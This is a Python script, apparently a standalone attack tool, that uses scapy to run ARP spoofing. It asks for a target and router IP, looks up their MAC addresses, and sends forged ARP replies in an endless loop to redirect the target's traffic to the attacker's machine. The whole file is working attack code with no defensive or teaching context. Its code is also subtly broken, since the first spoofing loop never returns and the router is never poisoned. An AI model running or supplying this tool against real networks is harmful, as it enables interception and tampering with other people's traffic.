from scapy.all import ARP, send, get_if_hwaddr, conf, arping, Ether
import time
import terminalColors

def findMac(ip):
    
    # Get the MAC address of the given IP address
    ans, _ = arping(ip, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def arpSpoofing(targetIP, spoofIP, targetMAC, spoofMAC):
    
    arpResponse = ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP, hwsrc=spoofMAC)
    
    while True:
        send(arpResponse, verbose=False)
        time.sleep(2)  

if __name__ == "__main__":
    
    targetIP = input(f"{terminalColors.TerminalColors.OKGREEN}Enter target IP: {terminalColors.TerminalColors.END}")
    routerIP = input(f"{terminalColors.TerminalColors.OKGREEN}Enter router IP: {terminalColors.TerminalColors.END}")  
    attackMAC = get_if_hwaddr(conf.iface)
    
    targetMAC = findMac(targetIP)
    routerMAC = findMac(routerIP)
    
    print(f"{terminalColors.TerminalColors.OKBLUE}Target MAC: {targetMAC}{terminalColors.TerminalColors.END}")
    print(f"{terminalColors.TerminalColors.OKBLUE}Gateway MAC: {routerMAC}{terminalColors.TerminalColors.END}")
    
    arpSpoofing(targetIP, routerIP, targetMAC, attackMAC)  
    arpSpoofing(routerIP, targetIP, routerMAC, attackMAC)  

